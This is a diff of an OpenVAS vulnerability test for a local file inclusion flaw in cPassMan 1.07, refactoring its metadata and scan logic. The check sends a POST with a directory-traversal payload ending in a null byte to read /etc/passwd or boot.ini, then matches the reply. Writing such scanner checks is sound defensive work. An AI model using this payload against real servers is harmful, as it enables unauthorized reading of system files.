@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_passman_43466.nasl 8269 2018-01-02 07:28:22Z teissa $
+# $Id: gb_passman_43466.nasl 11235 2018-09-05 08:57:41Z cfischer $
 #
 # Collaborative Passwords Manager (cPassMan) Multiple Local File Include Vulnerabilities
 #
@@ -24,76 +24,79 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "cPassMan is prone to multiple local file-include
-vulnerabilities because it fails to properly sanitize user-
-supplied input.
+CPE = "cpe:/a:cpassman:cpassman";
 
-An attacker can exploit these vulnerabilities to obtain
-potentially sensitive information and to execute arbitrary local
-scripts in the context of the webserver process. This may allow
-the attacker to compromise the application and the computer; other
-attacks are also possible.
-
-cPassMan 1.07 is vulnerable; other versions may also be affected.";
-
-
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.100828");
- script_version("$Revision: 8269 $");
- script_tag(name:"last_modification", value:"$Date: 2018-01-02 08:28:22 +0100 (Tue, 02 Jan 2018) $");
- script_tag(name:"creation_date", value:"2010-09-28 17:11:37 +0200 (Tue, 28 Sep 2010)");
- script_bugtraq_id(43466);
- script_tag(name:"cvss_base", value:"5.1");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
+  script_oid("1.3.6.1.4.1.25623.1.0.100828");
+  script_version("$Revision: 11235 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-05 10:57:41 +0200 (Wed, 05 Sep 2018) $");
+  script_tag(name:"creation_date", value:"2010-09-28 17:11:37 +0200 (Tue, 28 Sep 2010)");
+  script_bugtraq_id(43466);
+  script_tag(name:"cvss_base", value:"5.1");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:P/I:P/A:P");
+  script_name("Collaborative Passwords Manager (cPassMan) Multiple Local File Include Vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_family("Web application abuses");
+  script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
+  script_dependencies("gb_passman_detect.nasl", "os_detection.nasl");
+  script_require_ports("Services/www", 80);
+  script_mandatory_keys("cpassman/detected");
 
- script_name("Collaborative Passwords Manager (cPassMan) Multiple Local File Include Vulnerabilities");
+  script_xref(name:"URL", value:"https://www.securityfocus.com/bid/43466");
+  script_xref(name:"URL", value:"http://code.google.com/p/cpassman/");
+  script_xref(name:"URL", value:"http://cpassman.org/");
 
- script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/43466");
- script_xref(name : "URL" , value : "http://code.google.com/p/cpassman/");
- script_xref(name : "URL" , value : "http://cpassman.org/");
+  script_tag(name:"summary", value:"cPassMan is prone to multiple local file-include
+  vulnerabilities because it fails to properly sanitize user-supplied input.");
 
- script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_ATTACK);
- script_family("Web application abuses");
- script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
- script_dependencies("gb_passman_detect.nasl");
- script_require_ports("Services/www", 80);
- script_mandatory_keys("cpassman/installed");
- script_tag(name : "summary" , value : tag_summary);
- exit(0);
+  script_tag(name:"impact", value:"An attacker can exploit these vulnerabilities to obtain
+  potentially sensitive information and to execute arbitrary local scripts in the context
+  of the webserver process. This may allow the attacker to compromise the application and
+  the computer. Other attacks are also possible.");
+
+  script_tag(name:"affected", value:"cPassMan 1.07 is vulnerable. Other versions may also be affected.");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
+  Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the
+  product or replace the product by another one.");
+
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_tag(name:"solution_type", value:"WillNotFix");
+
+  exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
-include("version_func.inc");
+include("host_details.inc");
+include("misc_func.inc");
 
-port = get_http_port(default:80);
-if(!get_port_state(port))exit(0);
+if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
+if( ! dir  = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+if( dir == "/" ) dir = "";
+url = dir + "/index.php";
 
-if(!can_host_php(port:port))exit(0);
+files = traversal_files();
 
-if(!dir = get_dir_from_kb(port:port,app:"passman"))exit(0);
-url = string(dir,"/index.php");
+host = http_host_name( port:port );
 
-files = make_array("root:.*:0:[01]:","etc/passwd","\[boot loader\]","boot.ini");
+foreach file( keys( files ) ) {
 
-foreach file (keys(files)) {
+  postdata = "language=../../../../../../../../../../../../../../../../../" + files[file] + "%00";
 
-  postdata = string("language=../../../../../../../../../../../../../../../../../",files[file],"%00");
-
-  req = string(
-             "POST ", url, " HTTP/1.1\r\n",
-             "Host: ", get_host_name(), "\r\n",
-             "Content-Type: application/x-www-form-urlencoded\r\n",
-             "Content-Length: ", strlen(postdata), "\r\n",
-             "\r\n",
-             postdata
-        );
-
-  res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
-  if(egrep(pattern: file, string: res, icase: TRUE)) {
-    security_message(port:port);
-    exit(0);
-  } 
+  req = string( "POST ", url, " HTTP/1.1\r\n",
+                "Host: ", host, "\r\n",
+                "Content-Type: application/x-www-form-urlencoded\r\n",
+                "Content-Length: ", strlen(postdata), "\r\n",
+                "\r\n",
+                postdata );
+  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );
+  if( egrep( pattern:file, string:res, icase:TRUE ) ) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
+
+exit( 99 );
